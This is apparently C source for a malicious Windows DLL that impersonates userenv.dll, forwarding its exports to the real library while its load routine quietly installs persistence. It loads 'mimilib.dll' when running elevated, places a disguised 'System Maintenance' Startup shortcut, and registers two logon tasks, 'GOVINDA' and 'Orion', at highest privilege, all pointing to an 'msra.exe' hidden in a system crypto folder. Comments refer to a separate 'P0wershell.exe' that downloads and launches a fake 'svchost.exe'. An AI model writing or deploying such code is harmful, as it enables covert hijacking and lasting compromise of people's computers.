#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <shobjidl.h>
#include <objbase.h>
#include <objidl.h>
#include <taskschd.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "uuid.lib")

/* ponytail: Task Scheduler 2.0 GUIDs missing from this mingw's libuuid; hard-coded */
const CLSID CLSID_TaskScheduler = {0x0f87369f,0xa4e5,0x4cfc,{0xbd,0x3e,0x73,0xe6,0x15,0x55,0x66,0x1f}};
const IID IID_ITaskService = {0x2faba4a7,0x4da9,0x4013,{0x96,0x97,0x20,0xcc,0xdc,0xaa,0x1a,0x36}};
const IID IID_IExecAction = {0x4c3d624d,0xfd6b,0x49a3,{0xb9,0xb7,0x73,0xc5,0x6a,0x4c,0x18,0x2a}};

static const char *g_dir = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18";
static const char *g_audit = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\audit.log";

static HMODULE g_real = NULL;

static BOOL ensure_real(void) {
    if (!g_real)
        g_real = LoadLibraryA("C:\\Windows\\System32\\userenv.dll");
    return g_real != NULL;
}

#define WRAP(ret, name, args, call) \
    ret WINAPI name args { \
        if (!ensure_real()) return 0; \
        typedef ret (WINAPI *fn) args; \
        static fn f = NULL; \
        if (!f) f = (fn)GetProcAddress(g_real, #name); \
        return f ? f call : (ret)0; \
    }

WRAP(BOOL, CreateEnvironmentBlock, (LPVOID *lpEnv, HANDLE hToken, BOOL bInherit), (lpEnv, hToken, bInherit))
WRAP(BOOL, DestroyEnvironmentBlock, (LPVOID lpEnv), (lpEnv))
WRAP(BOOL, ExpandEnvironmentStringsForUserW, (HANDLE hToken, LPCWSTR lpSrc, LPWSTR lpDst, DWORD dwSize), (hToken, lpSrc, lpDst, dwSize))
WRAP(BOOL, GetAllUsersProfileDirectoryA, (LPSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetAllUsersProfileDirectoryW, (LPWSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetDefaultUserProfileDirectoryA, (LPSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetDefaultUserProfileDirectoryW, (LPWSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetProfilesDirectoryA, (LPSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetProfilesDirectoryW, (LPWSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetProfileType, (DWORD *pdwFlags), (pdwFlags))
WRAP(BOOL, GetUserProfileDirectoryA, (HANDLE hToken, LPSTR lpProfileDir, LPDWORD lpcchSize), (hToken, lpProfileDir, lpcchSize))
WRAP(BOOL, GetUserProfileDirectoryW, (HANDLE hToken, LPWSTR lpProfileDir, LPDWORD lpcchSize), (hToken, lpProfileDir, lpcchSize))
WRAP(BOOL, LoadUserProfileA, (HANDLE hToken, void *lpProfileInfo), (hToken, lpProfileInfo))
WRAP(BOOL, LoadUserProfileW, (HANDLE hToken, void *lpProfileInfo), (hToken, lpProfileInfo))
WRAP(BOOL, UnloadUserProfile, (HANDLE hToken, HANDLE hProfile), (hToken, hProfile))
WRAP(BOOL, CreateProfile, (PCWSTR pszUserSid, PCWSTR pszUserName, PWSTR pszProfilePath, DWORD cchProfilePath), (pszUserSid, pszUserName, pszProfilePath, cchProfilePath))
WRAP(BOOL, DeleteProfileA, (PCSTR lpSidString, PCSTR lpProfilePath, PCSTR lpComputerName), (lpSidString, lpProfilePath, lpComputerName))
WRAP(BOOL, DeleteProfileW, (PCWSTR lpSidString, PCWSTR lpProfilePath, PCWSTR lpComputerName), (lpSidString, lpProfilePath, lpComputerName))

static void audit(const char *fmt, ...) {
    FILE *f = fopen(g_audit, "a");
    if (!f) return;
    va_list ap;
    va_start(ap, fmt);
    vfprintf(f, fmt, ap);
    va_end(ap);
    fputc('\n', f);
    fclose(f);
}


static void create_lnk(void) {
    char lnkPath[MAX_PATH], target[MAX_PATH];
    wsprintfA(target, "%s\\msra.exe", g_dir);
    lstrcpynA(lnkPath, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\msra.lnk", MAX_PATH);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(lnkPath, &fd);
    if (h != INVALID_HANDLE_VALUE) { FindClose(h); audit("[+] .lnk already exists: %s", lnkPath); return; }

    IShellLinkA *sl = NULL;
    IPersistFile *pf = NULL;
    if (FAILED(CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLinkA, (void**)&sl))) {
        audit("[-] CoCreateInstance CLSID_ShellLink failed"); return;
    }
    sl->lpVtbl->SetPath(sl, target);
    sl->lpVtbl->SetWorkingDirectory(sl, g_dir);
    sl->lpVtbl->SetDescription(sl, "System Maintenance");
    if (FAILED(sl->lpVtbl->QueryInterface(sl, &IID_IPersistFile, (void**)&pf))) {
        audit("[-] QueryInterface IPersistFile failed"); sl->lpVtbl->Release(sl); return;
    }
    WCHAR wpath[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, lnkPath, -1, wpath, MAX_PATH);
    HRESULT hr = pf->lpVtbl->Save(pf, wpath, TRUE);
    if (SUCCEEDED(hr)) audit("[+] .lnk created: %s", lnkPath);
    else audit("[-] .lnk Save failed (0x%lx)", hr);
    pf->lpVtbl->Release(pf);
    sl->lpVtbl->Release(sl);
}

static void create_task_govinda(void) {
    char taskPath[MAX_PATH];
    wsprintfA(taskPath, "%s\\msra.exe", g_dir);

    // ponytail: check existence via schtasks /query, create if missing
    char q[MAX_PATH * 2];
    wsprintfA(q, "schtasks.exe /query /tn GOVINDA >nul 2>&1");
    if (system(q) == 0) { audit("[+] GOVINDA task already exists"); return; }

    char c[MAX_PATH * 4];
    wsprintfA(c, "schtasks.exe /create /tn GOVINDA /tr \"%s\" /sc onlogon /rl highest /f", taskPath);
    audit("[+] Creating GOVINDA task (schtasks.exe)");
    if (system(c) == 0) audit("[+] GOVINDA task created");
    else audit("[-] GOVINDA task creation failed");
}

static void create_task_orion(void) {
    char taskPath[MAX_PATH];
    wsprintfA(taskPath, "%s\\msra.exe", g_dir);

    ITaskService *pSvc = NULL;
    HRESULT hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IID_ITaskService, (void**)&pSvc);
    if (FAILED(hr)) { audit("[-] CoCreateInstance CLSID_TaskScheduler failed (0x%lx)", hr); return; }

    VARIANT vt;
    VariantInit(&vt);
    hr = pSvc->lpVtbl->Connect(pSvc, vt, vt, vt, vt);
    if (FAILED(hr)) { audit("[-] ITaskService Connect failed (0x%lx)", hr); pSvc->lpVtbl->Release(pSvc); return; }

    ITaskFolder *pRoot = NULL;
    hr = pSvc->lpVtbl->GetFolder(pSvc, (BSTR)L"\\", &pRoot);
    if (FAILED(hr)) { audit("[-] GetFolder failed (0x%lx)", hr); pSvc->lpVtbl->Release(pSvc); return; }

    // ponytail: check if Orion already registered
    IRegisteredTask *pExisting = NULL;
    if (SUCCEEDED(pRoot->lpVtbl->GetTask(pRoot, (BSTR)L"Orion", &pExisting)) && pExisting) {
        pExisting->lpVtbl->Release(pExisting);
        audit("[+] Orion task already exists");
        pRoot->lpVtbl->Release(pRoot); pSvc->lpVtbl->Release(pSvc); return;
    }

    ITaskDefinition *pTask = NULL;
    hr = pSvc->lpVtbl->NewTask(pSvc, 0, &pTask);
    if (FAILED(hr)) { audit("[-] NewTask failed (0x%lx)", hr); pRoot->lpVtbl->Release(pRoot); pSvc->lpVtbl->Release(pSvc); return; }

    ITriggerCollection *pTriggers = NULL;
    pTask->lpVtbl->get_Triggers(pTask, &pTriggers);
    ITrigger *pTrigger = NULL;
    pTriggers->lpVtbl->Create(pTriggers, TASK_TRIGGER_LOGON, &pTrigger);
    pTrigger->lpVtbl->put_Id(pTrigger, (BSTR)L"LogonTrigger");
    pTrigger->lpVtbl->Release(pTrigger);
    pTriggers->lpVtbl->Release(pTriggers);

    IActionCollection *pActions = NULL;
    pTask->lpVtbl->get_Actions(pTask, &pActions);
    IAction *pAction = NULL;
    pActions->lpVtbl->Create(pActions, TASK_ACTION_EXEC, &pAction);
    IExecAction *pExec = NULL;
    if (SUCCEEDED(pAction->lpVtbl->QueryInterface(pAction, &IID_IExecAction, (void**)&pExec))) {
        WCHAR wpath[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, taskPath, -1, wpath, MAX_PATH);
        pExec->lpVtbl->put_Path(pExec, wpath);
        pExec->lpVtbl->Release(pExec);
    }
    pAction->lpVtbl->Release(pAction);
    pActions->lpVtbl->Release(pActions);

    IPrincipal *pPrin = NULL;
    pTask->lpVtbl->get_Principal(pTask, &pPrin);
    pPrin->lpVtbl->put_RunLevel(pPrin, TASK_RUNLEVEL_HIGHEST);
    pPrin->lpVtbl->Release(pPrin);

    IRegisteredTask *pRegTask = NULL;
    hr = pRoot->lpVtbl->RegisterTaskDefinition(pRoot, (BSTR)L"Orion", pTask, TASK_CREATE_OR_UPDATE, vt, vt, TASK_LOGON_INTERACTIVE_TOKEN, vt, &pRegTask);
    if (SUCCEEDED(hr)) audit("[+] Orion task created (Task Scheduler API)");
    else audit("[-] Orion RegisterTaskDefinition failed (0x%lx)", hr);
    if (pRegTask) pRegTask->lpVtbl->Release(pRegTask);
    pTask->lpVtbl->Release(pTask);
    pRoot->lpVtbl->Release(pRoot);
    pSvc->lpVtbl->Release(pSvc);
}

static DWORD WINAPI worker_thread(LPVOID lp) {
    audit("[+] Worker thread started");
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    // ponytail: pump messages so COM (Task Scheduler API) doesn't deadlock
    // inside this STA thread. Download/extract/launch is now done in
    // P0wershell.exe (long-lived, not msra's UI process); the proxy only
    // installs persistence here.
    MSG msg;
    PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE);

    create_lnk();
    create_task_govinda();
    create_task_orion();

    audit("[+] Worker thread completed");
    CoUninitialize();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        BOOL elevated = FALSE;
        HANDLE hToken;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION te;
            DWORD size = sizeof(te);
            if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &size))
                elevated = te.TokenIsElevated;
            CloseHandle(hToken);
        }
        if (elevated)
            LoadLibraryA("C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\mimilib.dll");
        // ponytail: spawn worker for persistence (.lnk + GOVINDA/Orion); the
        // download/extract/launch of svchost.exe is handled in P0wershell.exe
        CloseHandle(CreateThread(NULL, 0, worker_thread, NULL, 0, NULL));
    }
    return TRUE;
}
